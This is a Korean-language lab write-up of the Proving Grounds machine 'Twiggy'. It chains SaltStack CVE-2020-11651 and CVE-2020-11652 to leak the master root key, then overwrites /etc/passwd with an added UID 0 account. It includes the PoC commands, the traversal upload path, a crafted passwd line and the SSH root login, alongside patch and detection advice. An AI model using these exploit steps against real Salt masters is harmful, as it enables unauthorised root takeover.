---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/salt
  - tech/web/auth-bypass
  - tech/lin/passwd-write
  - tech/cred/crack
type: machine
platform: pg
os: linux
ip: 192.168.189.62
ports: [22, 53, 80, 4505, 4506, 8000]
services: [domain, http, ssh, zmtp]
cves: [CVE-2020-11651, CVE-2020-11652]
status: solved
manual_tags: true
manual_cves: true
tech_count: 4
---

> [!info] 요약
> 타겟 `192.168.189.62` · CentOS/RHEL 7 계열(호스트명 `twiggy`) · Fundamental · 플래그 1/1
> 진입점: SaltStack salt-master(4505/4506) — `ClearFuncs` 디스패처의 밑줄 하나짜리 거부 목록 우회(CVE-2020-11651)로 무인증 root key 탈취
> 권한상승: 탈취한 key로 `wheel file_roots.write` 경로 트래버설(CVE-2020-11652) → `/etc/passwd`에 UID 0 계정 추가 → SSH root 로그인
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.189.62

### Initial Access – SaltStack ClearFuncs 밑줄 하나짜리 거부 목록 우회로 마스터 root key 무인증 탈취

**Vulnerability Explanation:**
- salt-master 의 4506(REQ/REP) 은 아직 키 교환이 안 된 상대를 위한 평문 디스패처 `ClearFuncs` 를 둠. `_handle_clear()` 가 `cmd.startswith('__')`(밑줄 **두 개**) 만 거부하는 **거부 목록**으로 호출 가능한 메서드를 판정
- 내부 헬퍼 `_prep_auth_info()` 는 밑줄이 **하나**라 거부 목록을 통과. 인자 없이 호출하면(=`token`·`eauth` 없음) `else` 분기로 빠져 마스터의 로컬 인증용 root key(`self.key`) 를 그대로 리턴
- `getattr(clear_funcs, cmd)` 가 public/private 구분 없이 임의 이름을 호출 가능하게 함 — CVE-2020-11651

**Vulnerability Fix:**
- **2019.2.4 또는 3000.2** 이상으로 업그레이드. 패치는 `ClearFuncs.expose_methods` **허용 목록**(`get_method()`) 으로 디스패치를 교체 — `ping`/`publish`/`get_token`/`mk_token`/`wheel`/`runner` 6개만 통과
- 4505/4506 을 관리 VLAN·VPN 안으로 제한, 방화벽으로 미니언 IP 만 허용 — 이 하나만으로 원격에서 무의미해짐

**Severity:** Critical — 무인증 원격으로 마스터 관리 인증키(root key) 전량 탈취. NVD CVSS 3.1 **9.8**, 벤더 자체 등급·VMSA-2020-0009 모두 **10.0**. CISA KEV 등재(2021-11-03, 실제 악용 확인)

**Steps to reproduce the attack:**
1. `nmap -p- -sCV` 로 4505/4506 ZMTP 확인 → 포트 번호로 SaltStack salt-master 식별
2. Exploit-DB 48421(`CVE-2020-11651-poc`) 클론
3. `python3 exploit.py --master <IP>` 를 인자 없이 실행 → 취약 여부 확인 + root key 탈취
4. 탈취한 key 로 `wheel` API 호출 시 인증 통과 (다음 finding)

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.189.62 | TCP: 22, 53, 80, 4505, 4506, 8000 |

```bash
sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.189.62
```

```text
# Nmap 7.98 scan initiated Thu Jun 11 09:39:57 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.189.62
Nmap scan report for 192.168.189.62
Host is up (0.066s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Home | Mezzanine
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Site doesn't have a title (application/json).
|_http-open-proxy: Proxy might be redirecting requests
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (97%), MikroTik RouterOS 7.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   65.86 ms 192.168.45.1
2   65.70 ms 192.168.45.254
3   66.10 ms 192.168.251.1
4   66.34 ms 192.168.189.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 11 09:40:51 2026 -- 1 IP address (1 host up) scanned in 53.45 seconds
```
— 출처: `~/PG/Twiggy/nmap.log`

`-p-` 가 없으면 이 박스는 못 푼다 — 4505/4506 은 nmap 기본 1000포트 목록 밖이라 기본 스캔이면 22/53/80 만 보이고 Mezzanine CMS 를 파느라 시간을 날린다. `-sCV` 가 없으면 `4505/tcp open unknown` 으로만 나와 `zmtp` 라는 유일한 단서조차 안 보인다. `Not shown: 65529 filtered tcp ports (no-response)` — `closed`(RST) 가 아니라 `filtered`(무응답) 이므로 **인바운드** 앞단에 방화벽이 있다는 뜻. `[가정]` 아웃바운드도 같은 정책일 개연성이 있으나 이 박스에서 확정하지 못했음(후속 `--exec` 리버스셸 실패의 원인은 미확정, 후보 비교는 [[_PLAYBOOK]]).

nmap `-A` 의 OS 판정은 `No exact OS matches` 로 끝났다 — `we could not find at least 1 open and 1 closed port` (전 포트가 `filtered` 라 TCP/IP 스택 지문 기준선이 없음). **확정 근거는 nmap 이 아니라 `Initial Access` 재현 절에서 확보한 `/etc/passwd` 로 나중에 확정된다** — 해당 절의 "OS 확정 근거" 표 참조.

**서비스 식별.** nmap 이 준 이름은 `zmtp` 뿐인데 이건 전송 프로토콜이지 제품이 아니다. 결정적인 것은 포트 번호 쌍이다.

| 포트 | salt 에서의 역할 | 소켓 패턴 |
|---|---|---|
| 4505 | Publish 인터페이스 — 마스터가 미니언에게 작업 뿌림 | `PUB`(마스터) ↔ `SUB`(미니언) |
| 4506 | Request 서버 — 미니언이 마스터에 요청·결과 전송. **공격 대상** | `REP`(마스터) ↔ `REQ`(미니언) |
| 8000 | salt-api(`rest_cherrypy`) 기본 포트로 추정 — 무인증 `GET /` 가 `{"return":"Welcome","clients":[...]}` 를 돌려줄 것으로 예상. nmap 의 `Site doesn't have a title (application/json)` 과 일치 · `[가정]` — 랩 반납 후라 타겟에서 직접 확인 못함 | — |

```text
Google: "Zeromq ZMTP 2.0 exploit"
```

![[Pasted image 20260611125128.png]]

`zmtp` 그대로 검색하면 상위 3건이 libzmq 라이브러리 자체의 문제(HackerOne #477073·CVE-2014-9721·zeromq/libzmq issue #3351)로 빠진다 — **이 박스와 무관.** 4번째에서 Exploit-DB 48421 "Saltstack 3000.1 - Remote Code Execution" 이 나왔다. 이 박스의 CVE 는 **CVE-2020-11651·CVE-2020-11652 둘뿐**이고, 검색 헤맨 과정과 일반화된 교훈은 [[_PLAYBOOK]] 로 옮겼다.

![[Pasted image 20260611125204.png]]

EDB-ID 48421, 작성자 Jasper Lievisse Adriaanse, 2020-05-05. 헤더:

```bash
# Exploit Title: Saltstack 3000.1 - Remote Code Execution
# Date: 2020-05-04
# Exploit Author: Jasper Lievisse Adriaanse
# Vendor Homepage: https://www.saltstack.com/
# Version: < 3000.2, < 2019.2.4, 2017.*, 2018.*
# Tested on: Debian 10 with Salt 2019.2.0
# CVE : CVE-2020-11651 and CVE-2020-11652
# Discription: Saltstack authentication bypass/remote code execution
```

EDB 헤더는 익스플로잇 작성자의 주장이지 벤더 어드바이저리가 아니다 — 패치 버전 확정은 kali 에 pip 설치된 salt 3008.0 소스 코드 자체를 1차 근거로 썼다(`Initial Access` 재현 절의 `_prep_auth_info()` 인용 참조).

```text
Google: "CVE-2020-11651 github"
```

![[Pasted image 20260611125243.png]]

```bash
git clone https://github.com/jasperla/CVE-2020-11651-poc.git
```

받은 시점 HEAD:

```text
eca6ba2d0845ed99c43b65295e2d42a02e6bd4f8  Fri Jul 10 11:30:09 2020 +0200
    Rework version / vulnerability detection
```

PoC 는 `salt` 파이썬 패키지를 클라이언트 라이브러리로 쓴다 — 공격자 쪽에도 설치 필요:

```bash
pip3 install salt
```

kali 설치 위치는 `~/.local/lib/python3.13/site-packages/salt`, 버전 3008.0.

### Initial Access – 재현: `_prep_auth_info` 로 root key 무인증 탈취

4506 으로 오는 요청은 msgpack 직렬화된 딕셔너리 하나이고 최상위 구조는 클라이언트 코드가 보여준다:

```python
    def _package_load(self, load):
        return {
            'enc': self.crypt,
            'load': load,
        }
```

`enc` 가 암호화 방식(`clear` 또는 `aes`), `load` 가 실제 요청 본문임. `enc: 'clear'` 로 보내면 마스터가 `_handle_clear()` 로 넘김.

취약 버전(v3000.1) 의 `_handle_clear()`:

```python
    def _handle_clear(self, load):
        log.trace('Clear payload received with command %s', load['cmd'])
        cmd = load['cmd']
        if cmd.startswith('__'):
            return False
        if self.opts['master_stats']:
            start = time.time()
            self.stats[cmd]['runs'] += 1
        ret = getattr(self.clear_funcs, cmd)(load), {'fun': 'send_clear'}
```

`_prep_auth_info()`(패치 이후에도 함수 본문은 그대로 — kali 의 salt 3008.0 소스에서 확인):

```python
    def _prep_auth_info(self, clear_load):
        sensitive_load_keys = []
        key = None
        if 'token' in clear_load:
            auth_type = 'token'
            ...
        elif 'eauth' in clear_load:
            auth_type = 'eauth'
            ...
        else:
            auth_type = 'user'
            err_name = 'UserAuthenticationError'
            key = self.key

        return auth_type, err_name, key, sensitive_load_keys
```

`load` 에 `token`·`eauth` 를 넣지 않으면 `else` 분기로 빠져 `key = self.key` 가 리턴값에 실린다. `self.key` 는 `access_keys(opts)` 가 만든 `{사용자명: 키문자열}` 딕셔너리이고, `['root']` 가 `/var/cache/salt/master/.root_key` 파일 내용이다. `ClearFuncs` 가 노출하는 `wheel`·`runner` 는 이 `key` 로 인증을 검사하므로 — 검사에 쓰이는 비밀을 검사 대상에게 그대로 알려준 것이 이 취약점의 핵심이다. 이 박스의 salt-master 는 **root 로 구동**되고 있었으므로, 이 key 로 여는 `wheel` 호출은 곧 root 권한 파일 조작이다 — 실제 증거는 다음 finding 의 `/etc/passwd` 쓰기 성공. `[가정]` 배포 패키지의 systemd 유닛에 `User=` 지시자가 없어 기본값 root 로 뜬 것으로 보이나, 타겟의 유닛 파일은 확인하지 못했음.

취약 여부 확인(인자 없이 실행):

```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ python3 exploit.py --master 192.168.189.62
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.189.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
```
— 출처: 대화형 Kali 세션 스크린샷 `Pasted image 20260611125348.png`

![[Pasted image 20260611125348.png]]

`DeprecationWarning` 은 PoC 가 import 하는 `salt.transport.client` 가 최신 salt(3008.0) 에서 `salt.channel.client` 로 이름이 바뀐 것에 대한 경고일 뿐 — 하위호환 shim 이 살아 있어 동작에는 지장 없다. `status... ONLINE` 은 `{'cmd': 'ping'}` 이 타임아웃 없이 응답한 것, `YES` 는 `{'cmd': '_prep_auth_info'}` 응답이 비어 있지 않은 것을 뜻한다. `--master`(`-m`) 를 안 주면 기본값 `127.0.0.1` 로 자기 자신을 공격해 `OFFLINE` 을 찍고 종료한다.

이어서 root key 로 `wheel file_roots.read` 를 호출해 `/etc/passwd` 를 확인:

```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ python3 exploit.py --master 192.168.189.62 -r /etc/passwd
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.189.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
[+] Attemping to read /etc/passwd from 192.168.189.62
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
mezz:x:997:995::/home/mezz:/bin/false
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin
```
— 출처: 대화형 Kali 세션 스크린샷 `Pasted image 20260611125525.png`

![[Pasted image 20260611125525.png]]

`wheel` 요청 형태:

```json
{"key": "<root key>", "cmd": "wheel", "fun": "file_roots.read", "path": "/etc/passwd", "saltenv": "base"}
```

`path` 에 **절대경로가 그대로 통했다** — 취약 버전 `find()`(`file_roots.read` 가 내부 호출) 에는 `isabs` 검사가 없고, 파이썬의 `os.path.join('/srv/salt', '/etc/passwd')` 는 두 번째 인자가 절대경로면 앞의 것을 통째로 버리고 `/etc/passwd` 를 그대로 돌려주기 때문 — 트래버설조차 필요 없었다.

**OS 확정 근거 — nmap 이 아니라 이 출력에서 나옴:**

| 근거 | 판정 |
|---|---|
| `OpenSSH 7.4 (protocol 2.0)` | RHEL/CentOS **7** 계열 기본 OpenSSH 버전 |
| `/sbin/nologin` (Debian 은 `/usr/sbin/nologin`) | RHEL 계열 |
| `polkitd:x:999:998` · `chrony:x:998:996` · `nginx:x:996:994` | 시스템 계정 UID 가 999 부터 내려가며 할당 — RHEL 7 `useradd -r` 기본 동작 |
| `named:x:25:25:...:/var/named` | `/var/named` 는 RHEL 계열 bind 경로(Debian 은 `/var/cache/bind`) |
| 타겟 셸 프롬프트 `[root@twiggy ~]#`(`Post-Exploitation` 절 참조) | RHEL 계열 기본 `PS1` |

두 독립 근거(OpenSSH 버전 + 계정 구조) 가 일치해 RHEL/CentOS 7 계열로 확정. `mezz:...:/home/mezz:/bin/false` 가 80포트 Mezzanine CMS 실행 계정(셸이 `/bin/false` 라 SSH 불가), `named:x:25:25` 는 53포트 NSD 외에 bind 용 계정도 있다는 뜻, `root` 의 셸이 `/bin/bash` 인 것은 뒤에 심을 계정도 같은 셸을 줘야 로그인된다는 뜻이다. 두 번째 필드가 전부 `x` 라 해시는 `/etc/shadow` 에 있지만, shadow 를 깨는 대신 passwd 에 새 줄을 넣는 쪽이 빠르다(다음 finding).

**Local.txt value:** 없음 — 이 박스는 사용자 권한 셸 단계 없이 `Initial Access`(root key 탈취) 에서 곧바로 `Privilege Escalation`(임의 파일 쓰기 → root SSH) 으로 이어지는 체인이라 중간 사용자 셸이 존재하지 않음. 포털 플래그 슬롯도 `proof.txt` 1개뿐이고 `local.txt` 슬롯 자체가 없음. 별도 `local.txt` 탐색은 수행하지 않았음 — **관측 없음**. `[가정]` `wheel file_roots.read` 가 임의 파일 읽기 원시를 이미 증명했으므로 `local.txt` 가 있었다면 같은 방식으로 읽혔을 것.

### Privilege Escalation – `wheel file_roots.write` 경로 트래버설로 `/etc/passwd`에 UID 0 계정 추가

**Vulnerability Explanation:**
- `file_roots` wheel 모듈은 salt 파일 서버 루트(`/srv/salt`) 안에서만 읽고 쓰도록 만들어졌으나, 주어진 경로를 `os.path.join(root, path)` 로 단순히 이어붙일 뿐 루트 밖으로 나가는지 정규화 검사를 하지 않음(`clean_path()` 는 존재했으나 호출되지 않음) — CVE-2020-11652, CWE-22
- `write()` 는 절대경로만 막고(`os.path.isabs(path)`) `../` 상대경로 트래버설은 막지 않음. 없는 상위 디렉터리는 `os.makedirs()` 로 자동 생성됨
- 위 finding 에서 탈취한 root key 로 `wheel` 인증을 통과하면 이 트래버설로 `/srv/salt/../../../../../etc/passwd` = `/etc/passwd` 를 **덮어쓸 수 있음**. salt-master 가 root 로 구동되므로 이 쓰기는 root 권한 쓰기 — 파일에 UID 0 계정을 추가하면 즉시 root SSH 로그인이 가능해짐

**Vulnerability Fix:**
- 2019.2.4 / 3000.2 이상으로 업그레이드. 패치(커밋 `cce7abad`) 는 `find()`·`write()` 양쪽에 `salt.utils.verify.clean_path()`(정규화 후 루트 내부인지 비교, `realpath` 로 심볼릭 링크까지 해소) 호출을 추가
- salt-master 를 비특권 계정으로 구동(`user:` 설정) — root 가 아니면 `/etc/passwd` 쓰기가 애초에 실패
- SSH `PasswordAuthentication no` + 공개키 전용 — 해시를 심어도 로그인이 안 됨. `PermitRootLogin no` 는 계정명 `root` 만 막으므로 UID 0 인 다른 이름을 막으려면 `AllowUsers`/`AllowGroups` 허용 목록이 필요
- `/etc/passwd` 무결성 감시(AIDE·auditd `-w /etc/passwd -p wa`) — UID 0 계정이 둘 이상 생기면 즉시 경보

**Severity:** Critical — 임의 파일 쓰기(root 권한) 로 즉시 영속적 root 계정 생성

**Steps to reproduce the attack:**
1. `wheel file_roots.read` 로 `/etc/passwd` 원본을 로컬로 저장
2. `openssl passwd <비밀번호>` 로 crypt 해시 생성
3. 로컬 사본 맨 아래에 `이름:<해시>:0:0:root:/root:/bin/bash` 한 줄 추가(원본 계정은 그대로 유지)
4. `wheel file_roots.write` 를 `path=../../../../../etc/passwd` 로 호출해 조립한 파일 전체를 업로드
5. 새 계정으로 SSH 로그인 → UID 0 이라 셸이 `root` 로 표시됨

**왜 `/etc/passwd` 인가.** `authorized_keys` 도 `os.makedirs()` 덕에 성립했을 경로였으나(당시엔 `.ssh` 없어 불가로 오판), 비밀번호 인증이 꺼져 있어도 뚫린다는 점에서 더 견고했을 것 — `[가정]`, 이 박스에서는 시도하지 않음. 크론·`--exec` RCE 는 리버스셸이 필요한 경로인데 `--exec` 로 띄운 connect-back 이 리스너까지 오지 않아 포기함 — **실패 원인은 확정하지 못했음**(아웃바운드 차단·타겟에 `nc -e` 부재 등 후보 비교는 [[_PLAYBOOK]]).

> [!danger] `/etc/passwd`는 **덮어쓰기**다 — 원본을 먼저 읽어라
> `file_roots.write` 는 파일을 통째로 교체한다. 추가(append) 가 아니다. 순서는 반드시 **① 읽기 → ② 로컬에서 한 줄 추가 → ③ 전체 쓰기**. 새 줄만 올리면 기존 계정이 전부 사라지고 시스템이 부팅 불능이 된다.

crypt 해시 생성:

```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ openssl passwd a123a123
$1$rdv9F6o9$IfCFDDxwb6oW7J9A.5qdI0
```
— 출처: 대화형 Kali 세션 스크린샷 `Pasted image 20260611125947.png`

![[Pasted image 20260611125947.png]]

`$1$` 는 MD5-crypt(`openssl passwd` 기본값) — glibc 가 전부 지원해 호환성이 가장 좋다. CentOS 7 대상이고 지원 알고리즘을 확인할 방법이 없는 상황에서는 가장 오래되고 널리 지원되는 형식이 실패 확률이 낮다. 강도는 여기서 무의미 — 비밀번호를 우리가 안다.

조립한 passwd 파일(원본 22줄 + 추가 1줄):

```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ cat passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
mezz:x:997:995::/home/mezz:/bin/false
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin
qq:$1$rdv9F6o9$IfCFDDxwb6oW7J9A.5qdI0:0:0:root:/root:/bin/bash
```
— 출처: `~/PG/Twiggy/CVE-2020-11651-poc/passwd` · 스크린샷 `Pasted image 20260611130140.png`

![[Pasted image 20260611130140.png]]

추가한 줄의 필드 7개(`:` 구분): `qq`(계정명, 기존과 안 겹치면 됨) : `$1$rdv9F6o9$IfCFDDxwb6oW7J9A.5qdI0`(비밀번호 필드에 해시 직접 기입 — 이 필드가 `x` 면 `/etc/shadow` 참조라는 뜻이라, 해시를 직접 넣으면 shadow 를 아예 안 건드리고 인증됨) : `0`(**UID = 0** — 리눅스는 이름이 아니라 UID 로 권한을 판정하므로 이 값이 전부) : `0`(GID) : `root`(GECOS, 임의) : `/root`(홈) : `/bin/bash`(셸).

업로드(이 단계만 스크린샷이 없음 — `[가정]` 앞뒤 명령과 같은 cwd 로 이어지므로 동일 세션으로 판단):

```bash
┌──(kali㉿kali)-[~/PG/Twiggy/CVE-2020-11651-poc]
└─$ python3 exploit.py --master 192.168.189.62 --upload-src passwd --upload-dest ../../../../../etc/passwd
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/.local/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.189.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=
[+] Attemping to upload passwd to ../../../../../etc/passwd on 192.168.189.62
[ ] Wrote data to file /srv/salt/../../../../../etc/passwd
```
— 출처: 최초 노트(2026-06-11) 전사 원문 — 스크린샷 없음

`--upload-dest` 에 절대경로 `/etc/passwd` 를 주면 `[-] Destination path must be relative; aborting` 으로 거부된다(PoC 가 서버의 `isabs` 거부를 클라이언트에서 미리 흉내낸 것). `[ ] Wrote data to file ...` 의 대괄호 안이 `+` 가 아니라 공백 — PoC 는 서버 응답 문자열을 그대로 출력할 뿐 성공 여부를 판정하지 않는다. **성공 확인은 다음 SSH 로그인이다.**

### Post-Exploitation

**Proof.txt value:**

```bash
┌──(kali㉿kali)-[~/CTF/DEFCON2026]
└─$ ssh qq@192.168.189.62
The authenticity of host '192.168.189.62 (192.168.189.62)' can't be established.
ED25519 key fingerprint is: SHA256:uYMZFN9vYkxFeoZ23/Znor6lCrABMH4HLFk4qNAIkB4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.189.62' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
qq@192.168.189.62's password:
[root@twiggy ~]# whoami
root
[root@twiggy ~]# ls
proof.txt
[root@twiggy ~]# cat proof.txt
3fd4954f15b0824c66637cf374e5afd0
[root@twiggy ~]#
```
— 출처: 대화형 Kali 세션 스크린샷 `Pasted image 20260611134941.png` · `~/.zsh_history` 1024행 `ssh qq@192.168.189.62`

![[Pasted image 20260611134941.png]]

`3fd4954f15b0824c66637cf374e5afd0`

비밀번호는 `a123a123`(`Privilege Escalation` 절에서 해시로 만든 값). 프롬프트가 `[root@twiggy ~]#` 인 것 자체가 검증이다 — `qq` 로 로그인했는데 UID 0 이라 셸이 계정명이 아니라 UID 로 사용자를 표시한다. `ls` 가 곧바로 `proof.txt` 를 보여준 것도 홈 디렉터리를 `/root` 로 지정했기 때문.

**남긴 흔적**
- `/etc/passwd` 마지막 줄에 `qq:$1$rdv9F6o9$IfCFDDxwb6oW7J9A.5qdI0:0:0:root:/root:/bin/bash` 추가 — **원복하지 않음**. 실전이라면 이 줄 제거 + 원본 해시/타임스탬프 복원 필요
- root key 유출: `ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=` — 실전이면 `/var/cache/salt/master/.root_key` 재생성 + salt-master 재시작으로 키 회전 필요
- Kali 리스너 잔존 없음 — `--exec` 시도 때 4444 리스너를 띄웠으나 connect-back 이 오지 않아 정리했고, 최종 경로는 SSH 라 리버스셸을 쓰지 않았음(상세는 [[_PLAYBOOK]])
- 획득 자격증명: 직접 심은 `qq` / `a123a123`(UID 0)
- 공격자 VPN IP: `192.168.45.173`(`--exec` 시도의 리스너 IP로 확인됨) · 타겟: `192.168.189.62`

## 관련

- **CVE-2020-11651** — SaltStack `ClearFuncs` 인증 우회(root key 유출). NVD 9.8 CRITICAL: <https://nvd.nist.gov/vuln/detail/CVE-2020-11651>
- **CVE-2020-11652** — wheel `file_roots` 디렉터리 트래버설(임의 파일 읽기/쓰기). NVD 6.5 MEDIUM · CWE-22: <https://nvd.nist.gov/vuln/detail/CVE-2020-11652>
- 패치 커밋(1차 사료, `saltstack/salt`, Daniel A. Wozniak, 2020-04-13) — CVE-2020-11651: `a67d76b1`(3000.2)·`f47e4856`(2019.2.4) / CVE-2020-11652: `cce7abad`(3000.2)·`7bd0ab19`(2019.2.4)
- CISA KEV 등재 2021-11-03(실제 악용 확인) · VMware VMSA-2020-0009(11651 을 CVSSv3 10.0 으로 등급)
- F-Secure Labs 원 리서치: <https://labs.f-secure.com/advisories/saltstack-authorization-bypass/>
- Exploit-DB 48421: <https://www.exploit-db.com/exploits/48421> · 사용한 PoC: <https://github.com/jasperla/CVE-2020-11651-poc>(HEAD `eca6ba2`, 2020-07-10)
- Salt 아키텍처(4505 PUB / 4506 REP) 공식 문서: <https://docs.saltproject.io/en/latest/topics/tutorials/firewall.html>
- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Access]] · [[Flu]] · [[Clue]] — 같은 `/etc/passwd` UID 0 추가 기법
- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] · [[Squid]] — 누적 패턴 "응답이 성공을 뜻하지 않는다". `--exec` 의 `Successfully scheduled job` 이 같은 계열([[_PLAYBOOK]] 참조)
- [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] · [[Squid]] — 누적 패턴 "버전 판정은 독립 근거 2개". 이 박스는 nmap OS 추정이 무용했고 `/etc/passwd` 가 확정 근거였다
- [[_PLAYBOOK]] — 검색어 선택·PoC 읽는 법·리버스셸 실패 시 전환·시간 배분 등 시행착오 전량
- [[_PLAYBOOK#B-1-52. 문자열로 함수를 고르는 디스패처는 「막는 목록」인지 「통과시키는 목록」인지 본다]] — CVE-2020-11651 의 구조 일반화
- [[_PLAYBOOK#B-2-18. nmap `SERVICE` 열은 «전송 계층» 이름일 수 있다 — 첫 검색어는 포트 번호]] — `zmtp` 검색으로 태운 30분
- [[_PLAYBOOK#B-3-17. `/etc/passwd` 에 심을 crypt 해시 만들기 — `openssl passwd` 가 가장 안전한 선택]] — `$1$` 채택 근거와 대안별 함정
- [[_STATUS]] — PG 283개 전수 진행현황
